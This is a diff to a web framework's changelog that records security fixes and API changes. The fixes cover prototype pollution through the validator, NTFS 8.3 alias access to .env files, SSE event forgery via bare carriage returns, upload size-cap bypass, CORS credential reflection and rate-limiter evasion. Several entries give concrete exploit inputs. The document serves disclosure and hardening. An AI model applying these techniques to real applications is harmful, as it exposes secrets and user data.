+  `toJSON`, or a throwing `.stack`: `log.info('paid', { amount: 10n })` threw in any app that
+  keeps money in BigInt. Every logger call in the scheduler is now isolated exactly as the
+  observer already was, `report()` runs first, and the serializer degrades to a marker instead of
+  throwing. A payout worker no longer exits mid-cycle because a log line could not be written.
+
+- **A cyclic error-shaped field OOM-killed the process through the pretty sink**, with no
+  catchable exception, because the cause walk had no depth cap and concatenated a string per hop
+  while `isErrorShape` accepted any object with `name`/`message`. The walk is now depth-bounded
+  and cycle-aware.
+
+- **Redaction missed the shape everyone actually logs.** It matched top-level keys only,
+  case-sensitively, over own properties - while serialization emitted inherited keys too. So
+  `Authorization` was not `authorization`, `{ headers: req.headers }` was stringified whole, and
+  a secret on the fields object's prototype was written but never redacted, all while the module
+  header promised "a redacted field never reaches ANY sink". Redaction is now case-folded,
+  matches a bare name at any depth, supports dotted paths, is transparent through arrays,
+  depth-capped and cycle-aware, and never mutates the application's own object. The serializer
+  and the redactor now iterate one key set.
+
+- **`object()` read INHERITED properties, turning any prototype pollution elsewhere into mass
+  assignment through the validator.** With `Object.prototype.role = 'admin'` polluted by any
+  other component, `object({ name, role, isAdmin }).parse(JSON.parse('{"name":"bob"}'))` returned
+  `role: 'admin', isAdmin: true` as VALIDATED data - from the one layer an app trusts to make
+  input safe, and which correctly strips unknown OWN keys. Field reads are own-property only now.
+
+- **A validation error whose path collided with an `Object.prototype` member was erased or
+  replaced by a function on the wire.** `__proto__` hit the prototype setter and vanished (the
+  wire showed `Validation failed for 0 fields` with an empty map), while `constructor` kept the
+  inherited function, which `JSON.stringify` then omitted. Any consumer treating the documented
+  `FieldErrors` as `Record<string, string>` would crash on it. The map is null-prototype and
+  written through `defineProperty`, and `record()` now strips an own `__proto__` key so a
+  validated body is safe to `Object.assign` - it previously handed the handler a
+  prototype-pollution primitive.
+
+- **A calendar-impossible cron expression cost ~880 ms of `Intl` calls before failing**, so ten
+  registrations stalled a boot for 8.5 seconds and any app exposing job registration turned one
+  request into ~0.9 s of total unavailability. Impossible day and month pairs are now rejected
+  arithmetically at parse time: the same seven expressions went from about 6 seconds to under
+  200 ms, and the leap-day case still resolves correctly.
+
+- Also: a throwing sink can no longer break the log call; the pretty face strips terminal control
+  bytes from field values, the message, the error block and the request path, so a log line can
+  no longer clear the operator's screen; `phone()` answers a non-string with a message instead of
+  a TypeError, matching every sibling validator; `SchemaError.message` bounds and sanitizes
+  attacker-supplied paths rather than repeating them in the framework's own `path: message`
+  grammar; and the log directory and file are created 0700/0600 with `mode` options, so files
+  that can contain bearer tokens are not world-readable.
+
+### Security (http bodies, uploads, file serving, streaming)
+
+- **A streaming response that failed mid-body killed the process, and every aborted compressed
+  download leaked a file descriptor.** `compressResponse` used `.pipe()` rather than
+  `pipeline()`: when the source errored, Node's pipe handler unpiped itself and re-emitted on a
+  source with no listener, which is an unhandled `'error'` event and an immediate exit (confirmed
+  at exit code 9; the identical server without compression survived). The same missing
+  propagation meant a client disconnect destroyed only the zlib transform, never the
+  `fs.ReadStream` behind the file. The trigger was routine rather than hostile: a database cursor
+  dying halfway through a streamed report. One switch to `stream.pipeline` closes both
+  directions.
+
+- **`staticFiles` served `.env` and `.git` on Windows.** The dotfile guard ran on the REQUESTED
+  path, but NTFS 8.3 aliases resolve on the filesystem, so `/assets/.env` correctly 404'd while
+  `/assets/ENV~1` returned the file, case-insensitively and through percent-encoding. The
+  containment check already called `realpath`, but only to compare a prefix. The dotfile rule is
+  now applied to the RESOLVED path.
+
+- **A lone carriage return in an SSE payload forged arbitrary events, including the event name.**
+  The framer split on `\n` only, but the event-stream grammar also terminates a line on a bare
+  CR, so everything after one parsed as fresh fields. Verified in real Chromium: a single
+  `send()` of user text produced a forged `transfer` event with an attacker-chosen payload.
+  `event:`, `id:` and `comment()` were not sanitized at all and are now single-line by
+  construction.
+
+- **Reading the body twice hung the request forever, and only in production.** The adapter's fast
+  lane attached `'end'` to an already-drained stream, so the promise never settled - and because
+  the body had been fully received the request timeout was already cleared and nothing reclaimed
+  the socket. One wedged connection and one leaked request root per attempt, unbounded. It was
+  invisible in tests because the portable path throws a locked-stream error instead, so the shape
+  that matters (an HMAC guard reading the raw body, then the handler reading it again) failed
+  only on the Node adapter. Both lanes now fail identically and loudly, an abort settles the
+  read, and `bodyUsed` tells the truth after a fast-lane read.
+
+- **`sse()` leaked its producer, heartbeat and request root when the client was already gone.**
+  It registered an abort listener without checking `signal.aborted` first, and a listener added
+  to an already-aborted signal never fires, so a disconnect during setup left the 15s heartbeat
+  armed and the producer pending forever. Measured 13 heartbeats produced after the client left,
+  with zero teardowns.
+
+- **An SSE producer failure was reported to the client as SUCCESS.** The catch discarded the
+  error and called `close()`, which emits the `[DONE]` terminator, so a ledger or price stream
+  that died after page one was consumed as complete and the operator got no signal at all. The
+  stream now ends WITHOUT the terminator and the error is reported through a new `onError`, or
+  rethrown so the runtime sees it.
+
+- **`maxFileSize` was bypassable, and binary uploads were silently corrupted, via `filename*=`.**
+  Part classification matched only `filename=`, so the RFC 8187 form was treated as a text field:
+  exempt from the per-file cap (a 300 KB part passed a 1 KB limit) and UTF-8 decoded rather than
+  preserved (`89504e47fffe0001` came back as `efbfbd504e47efbfbdefbfbd0001`), which is exactly
+  the mangling the module documents itself as avoiding. The inverse also worked: a `;` inside a
+  quoted `name` forged a filename. Parameters are now scanned outside quoted strings only, and
+  `filename*` is decoded and takes precedence.
+
+- **A hostile multipart boundary made the parser quadratic.** The client picks both the boundary
+  and the bytes, and the buffered parser searched with no skip heuristic and an un-prefixed
+  delimiter, so 63 ms of blocked event loop per MiB (14x a benign boundary) ran BEFORE any
+  part-count limit. The buffered path now uses the same CRLF-prefixed delimiter the streaming
+  path always did: 1 MiB of dashes went from 41.5 ms hostile / 2.0 ms benign to 0.9 / 0.8.
+
+- **Compression ignored `q=0`, so responses were encoded with codings the client had explicitly
+  refused** (`br;q=0, gzip` was served br). Weights are now parsed, `q=0` is a refusal, and the
+  heaviest weight wins. `Cache-Control: no-transform` is honoured, and a compressed response
+  carries its own ETag so a cache can no longer serve gzip bytes as identity - with the
+  conditional path accepting an encoding-suffixed validator only while the client still accepts
+  that coding, so revalidation still answers 304.
+
+- **`staticFiles` advertised `Last-Modified` and ignored `If-Modified-Since`**, so every
+  conforming cache, CDN and `curl -z` got a full retransmission. It is now honoured, with
+  `If-None-Match` keeping precedence.
+
+### Security (http middleware)
+
+- **A throwing CORS origin predicate or rate-limit store took the process down.** The idiomatic
+  subdomain allowlist is `origin: (o) => new URL(o).hostname.endsWith('.example.com')`, and
+  browsers themselves send the literal `Origin: null` for sandboxed iframes, so one curl was an
+  unauthenticated kill. A predicate throw is now a denial, and a store outage or throwing key
+  fails CLOSED to a 429 rather than a rejection.
+
+- **`cors({ origin: true, credentials: true })` reflected any origin, including `null`, with
+  credentials.** The guard against `*`-with-credentials existed but DOWNGRADED to reflecting the
+  caller's Origin while still sending `Access-Control-Allow-Credentials: true`, which is strictly
+  worse: browsers block the former and honour the latter. Any website could read an authenticated
+  response. That combination now throws at wiring time, and the scaffolded backend template names
+  an explicit dev origin instead.
+
+- **`serializeCookie` interpolated `path` and `domain` raw**, despite documenting that it
+  validates attribute values. Since duplicate cookie attributes are last-wins, a tenant-derived
+  path could widen a session cookie across every sibling subdomain, and a CRLF in one killed the
+  process through `writeHead`. Both are now validated against their RFC 6265 grammars, and a
+  non-finite `maxAge` no longer emits `Max-Age=NaN`.
+
+- **The rate limiter was decorative in every real deployment.** Its default key is the TCP peer,
+  so behind any proxy every client shared ONE bucket and the configured limit became a global
+  budget: 100 requests per minute locked out the whole service. `trustProxy` fixed only a
+  single-proxy chain because `trustedHops` was never forwarded and was absent from the options.
+  And the key used the full IPv6 /128, so one VPS with a routed /64 had 2^64 free buckets and
+  never tripped the limiter at all, with nothing spoofed. `trustedHops` is now forwarded, keys
+  bucket IPv6 to a configurable prefix (default /64) via the new `ipBucket`, and a runtime with
+  no client identity refuses loudly instead of silently sharing one bucket.
+
+- **The limiter's own memory was unbounded**: it swept on a fixed 60s interval regardless of
+  `windowMs`, had no entry cap, and accepted an attacker-sized key. The sweep now tracks the
+  window, the map has a capacity with oldest-key eviction, and keys are bounded.
+
+- **CORS preflights bypassed the limiter entirely** in the middleware order the framework itself
+  scaffolds, giving an unmetered request channel. Preflights now delegate through the inner
+  handler and carry its `RateLimit-*` headers.
+
+- **Preflight reflected `Access-Control-Request-Headers` verbatim**, approving Authorization and
+  any CSRF header the caller named, which removed the last mitigation once an origin check was
+  permissive. The default is now the CORS safelist plus Content-Type.
+
+- **`securityHeaders()` silently overwrote a handler's stricter header**, so a route hardened with
+  `X-Frame-Options: DENY` was downgraded to the global `SAMEORIGIN`. A baseline value now yields
+  to a header the response already carries, while an explicitly configured value still wins.
+
+- **HSTS was emitted over plaintext on the client's word**, contradicting the module's own stated
+  guarantee, by reading `X-Forwarded-Proto` with no trust gate - the same header the adapter
+  refuses to believe without `trustProxy`. It is now gated by an explicit option, and the
+  pre-existing test that asserted the vulnerable behavior has been corrected.
+
+- **`logRequests` emitted NO record when `Host` was malformed.** It built a URL to get the path,
+  which throws on an authority the router never parses, and observer throws are swallowed by
+  design - so a request was fully served with no audit line at all. It now uses the kernel's own
+  string scan.
+
+- **`prettySink` could be line-forged**: string fields and the message were interpolated raw
+  while non-strings went through `JSON.stringify`, so a newline in a user-supplied field wrote a
+  second line indistinguishable from a real record. Control characters are now escaped.
+
+- **`loadConfig` printed a `secret: true` variable's raw value in the boot error**, straight to
+  stderr and CI logs, because the redaction covered the object's serializations but not the
+  failure path. It now names the variable without echoing the value, and `flag`/`oneOf` accept
+  `secret` too.
+
+- **`parseCookies` dropped any cookie named after an `Object.prototype` member** (`toString`,
+  `constructor`) because membership was tested with `in` on a plain object, returning the
+  inherited function. The record is null-prototype now.
+
+### Security (contract layer)
+
+- **A guard key that addressed no route was silent, leaving those routes unguarded.** `mountApi`
+  enforced handler coverage at boot and had no equivalent check for guards, and the type could
+  not catch it either: `Guards` is inferred from the map literal, so TypeScript's
+  excess-property check only fires when NO key is valid, and every real map has a valid key
+  (usually `'*'`). A renamed group, or a wildcard written for an absolute path and then mounted
+  as a subtree, therefore produced an unauthenticated endpoint with no compile error, no boot
+  error and no log line - and because a pure gate (auth, CSRF, rate limit) adds nothing to the
+  context, no handler type changed either. An unmatched guard key now throws at mount, naming
+  the key and listing the known routes. The doc comment that claimed the type caught this has
+  been corrected to describe what the code actually guarantees.
+
+- **Three prototype-shadowing lookups in the mount are own-property only.** A route keyed
+  `toString` crashed the mount with an opaque spread error, and a query or multipart field named
+  `constructor` was silently replaced by the inherited function and 422'd the route forever.
+
+### Changed (schema)
+
+- **Schema composition is object composition; no `extend`/`pick`/`omit` was added.** An input
+  schema and the stored shape it grows into share fields, and the obvious fix was three new
+  combinators. They are not needed: `object()` takes a plain literal, so keeping the FIELDS as
+  the reusable value lets `{ ...entryFields, id: number() }` extend, destructuring omit, and
+  selection pick - with exact inference and the constraints carried along, which a typecheck
+  now pins. Three functions that re-express what the language already does would have been
+  surface to learn, document, and keep working for nothing. The fullstack template shows the
+  pattern instead of repeating `name` and `message` across its two schemas.
+
 ### Fixed (schema)
 
 - **`phone()` accepted a malformed number built from the `00` international prefix.** With a
@@ -50,6 +815,69 @@ follow [Semantic Versioning](https://semver.org).
   stay out of it deliberately: the nested lowerer does not transform them, and listing them
   would cost the verbatim mapping of any module that uses `form` or `store` as a plain name.
 
+### Changed (http)
+
+- **Handlers are keyed by the contract's DOTTED ROUTE PATH; the nested handler tree is gone.**
+  BREAKING. One route had two addressing schemes: guards were always dotted (`'admin.orders'`,
+  `'admin.*'`), while handlers were a nested object that had to mirror the contract's shape. The
+  nesting bought nothing at runtime - the mount already computed the dotted path one line above
+  the handler lookup, to resolve guards - and it cost a feature its independence: to be spread
+  into the mount it had to be wrapped at exactly the depth it lands, so a feature file knew which
+  group it belonged to and moving a service under a new prefix edited every feature. Now
+  `handlers: { 'guestbook.sign': ... }` shares the guards' key space, assembling features is a
+  plain spread with no wrapper, and a key that is not a route path is a compile error rather than
+  a silently ignored entry. To migrate, flatten each nesting level into a dotted key.
+
+- **`@azerothjs/http/api/client` is now `@azerothjs/http/api/shared`.** BREAKING, and the old
+  specifier is gone rather than aliased. A contract is ONE declaration both halves read, but a
+  contract file had to import `defineContract` from a path named `client` - which reads as
+  "contracts are a client-side thing", the exact opposite of what they are. The subpath never
+  meant "the client's half"; it meant "the half that is safe to put in a browser bundle", and
+  the name taught the wrong model to at least one reader. `shared` says what it is. The
+  boundary itself is unchanged and still statically proven: the entry cannot reach `mountApi`,
+  `guard`, or anything Node, so importing it can never drag the server into a bundle. To
+  migrate, replace the specifier; nothing else moves. Note for whoever cuts the release: the
+  fullstack template now imports the new specifier, so a scaffolded app only resolves once this
+  version is on the registry - templates pin the version they ship beside, and until then a
+  local scaffold must point its `@azerothjs/*` deps at the workspace.
+
+### Added (http)
+
+- **`group(prefix, routes)` writes a service's base path once.** In a real 17-route app, 14 routes
+  restated `/admin` and 3 restated `/pay`, which is a rename waiting to go half-finished. `group`
+  prepends the prefix to every route it wraps, including nested groups. Paths stay EXPLICIT
+  strings rather than being derived from key names, because a key and its path legitimately differ
+  - `signIn` answers `/session` - and a framework that guessed would be wrong exactly where it
+  matters.
+
+- **`merge(...groups)` refuses to lose a route.** Combining feature groups was an object spread,
+  which is last-wins: two features that happened to pick the same key dropped one of the routes
+  out of the API with nothing failing anywhere, and the router's own duplicate check only fires if
+  the two also share a method and a path. `merge` throws on a duplicate key, naming it, at module
+  load - so the failure is at boot in every environment rather than a 404 in production.
+
+- **`only()` makes a group guard usable: guard the wildcard, name the exceptions.** Guarding an
+  admin console meant listing every route by hand - twelve `'admin.x': [requireAdmin]` lines -
+  purely so the one route that must NOT be guarded (signing in, which is how you get past the
+  guard) could be left out. That is backwards: the default was unguarded, and a route added
+  later was silently public. `'admin.*': [requireAdmin]` now covers the group, and
+  `'admin.signIn': only([...])` declares a complete chain that replaces everything it would
+  otherwise inherit. The opt-out is EXACT-PATH only, because a wildcard cancelling another
+  wildcard would make a route's real chain depend on declaration order. Crucially it resets the
+  TYPE as well as the runtime chain: an opted-out handler cannot read a field no guard attached,
+  which would otherwise be an `undefined` behind a property TypeScript promised was there.
+
+- **`implement()` lets a feature type its handlers from its own routes.** A feature owning part
+  of a larger contract had to describe its handlers by reaching for the assembled tree and
+  narrowing it - `Pick<HandlersWithGuards<typeof contract, Record<never, never>>['admin'],
+  'signIn' | 'overview' | ...>` - which imports the whole contract to say something local,
+  names every route a third time, and hardcodes the guard additions as "none". The observable
+  cost was that handlers went back to hand-annotating their own context, which is exactly the
+  work the derived types exist to do. `implement(routes, handlers)` is identity at runtime and
+  types the handlers against that group alone, with the guards' additions as an optional second
+  type argument, so a feature file needs no reference to the contract it joins and a missing,
+  extra, or wrongly-typed handler is a compile error at the feature rather than at the mount.
+
 ### Fixed (http)
 
 - **`route()` let a GET declare a request body.** The six verb helpers cover every
@@ -88,6 +916,35 @@ follow [Semantic Versioning](https://semver.org).
   in one module shared by the server mount and the client's pre-flight check, and
   `RouteSchema<T>` names what was always structurally true: any Standard Schema validator,
   with the native schema's extras discovered by capability, never required.
+
+### Removed (http)
+
+- **The browser entry no longer exports `guard`.** BREAKING for anyone who imported it from
+  `@azerothjs/http/api/shared`, which nothing in either repo did. A guard runs on the server, in
+  front of a handler; there is nothing for one to do in a browser, and the entry's own header
+  states that the guard and mount half "lives only in the root entry". Exporting it there was
+  server surface leaking into the one entry whose whole job is to be safe to bundle. `guard`,
+  `Guard`, and `GuardContext` come from `@azerothjs/http/api` as they always did.
+
+- **The contract layer's dead type machinery is gone.** An audit of all 46 exports in the layer,
+  each verified by deleting it and re-running the type-level assertions under `tsc`: the
+  `StandardSchemaV1` re-export (no consumer, and in neither entry, so no package consumer could
+  even see it), `Guard`'s phantom `__add` field (`AddOf` infers through the call signature, so the
+  declaration was its own only reference), the unused outer `infer` in `AddOf`, and the outer
+  conditional in the client's `Call` type, which tested `extends Record<string, never> | unknown`
+  - unconditionally true, making its `never` branch unreachable. Nothing observable changes; there
+  is simply less to read. Deliberately KEPT despite having no consumer yet: `uncontracted`, which
+  is how an existing app burns down onto contracts one route at a time, and the OpenAPI exporter
+  plus explorer, 42% of the layer and the only path by which a non-TypeScript client can consume
+  the API at all.
+
+- **A route's response schema is resolved in one place.** The rule that `responses[status]` wins
+  and `output` is the shorthand for the 200 entry was implemented twice, independently, in the
+  mount and in the OpenAPI exporter - which is how a document starts describing something the
+  server does not enforce. Both now call one `responseSchemaFor`. In the same pass the mount's
+  "first value wins" flattening of repeated query parameters and repeated multipart fields, two
+  copies of one loop with a comment on the second promising it matched the first, became one
+  shared helper.
 
 ### Added (create-azeroth)
 
@@ -157,6 +1014,27 @@ follow [Semantic Versioning](https://semver.org).
   the handler runs. `/healthz` stays: it is infrastructure every orchestrator probes, not a
   demo. The template's own test grew from three cases to five, and now covers the middleware
   veto and the field map.
+
+- **The fullstack template's wiring files carry code, not lectures.** `server/src/contract.ts`
+  was 27 comment lines around 20 lines of declaration - 57% prose, in the file a reader opens
+  every time they add a route, explaining what the README already explains better. The
+  template's wiring dropped from 485 lines to 403 with nothing removed but narration. What
+  survives states a constraint the code cannot: this file is client-safe so importing a service
+  here would bundle the server, the key path IS the client's call path, a trailing space
+  survives SSE framing while a leading one is eaten, devtools must install before the first
+  render. The declaration now reads as an example worth copying rather than a tutorial to skim.
+
+- **The fullstack template teaches both kinds of route, and streams.** It implied everything
+  belonged in the contract, which is wrong and is why the contract felt like overhead: the
+  typed client REFUSES a multipart route by design, and a streaming response has no JSON body
+  to validate, so uploads, webhooks, redirects and token streams were never its job. The
+  server half now has `src/stream.ts` beside `src/contract.ts` holding the raw routes, with
+  `GET /api/assistant` as a worked server-sent token stream, and the README states the rule:
+  the contract is for routes whose whole request and whole response are JSON values worth
+  validating, everything else owns its own `Response`. The home page consumes it with the
+  `stream` keyword - which no template previously demonstrated - accumulating events into one
+  reactive string, and its Stop button cancels the request, which is where a real handler
+  stops paying a model provider.
 
 - **Import depth is now a tested constraint.** The tailwind overlay ships its own copy of the
   guest-book page, so fixing the base template's deep import left the overlay's behind - a
@@ -242,6 +1120,22 @@ follow [Semantic Versioning](https://semver.org).
   entry and the app shell all spoke of guards and loaders, but no route declares one, so the
   loader handoff is always `undefined`. The wiring stays (adding a loader is then a one-line
   change) and the comments now say so. An unused `EntryInput` export went with it.
+
+### Fixed (docs)
+
+- **Five reference pages documented packages that do not exist.** `packages/azerothjs/docs/` shipped
+  `component.md`, `form.md`, `reactivity.md`, `renderer.md` and `server.md` as if each were its own
+  package, complete with an npm badge and an `npm install @azerothjs/renderer` line, from before
+  those packages were folded into the unscoped `azerothjs` entry. Published, every one of those
+  badges would have rendered as "not found" and every install line would have failed. The pages are
+  retargeted rather than deleted: they describe functionality that still ships, so the titles, the
+  badges, the install blocks and the imports now all name `azerothjs`.
+
+- **`App` had no documentation on hover.** The class the template's first line imports, its
+  constructor, and `get`/`post`/`put`/`patch`/`delete` carried no doc comment at all, so an editor
+  showed a signature and nothing else - while `use`, `with` and `register` beside them were
+  documented in depth. The class now states what accumulates in `Ctx` and why registration order is
+  load-bearing, with a worked example, and `get` records that it answers HEAD as well.
 
 ### Fixed (cli)
 
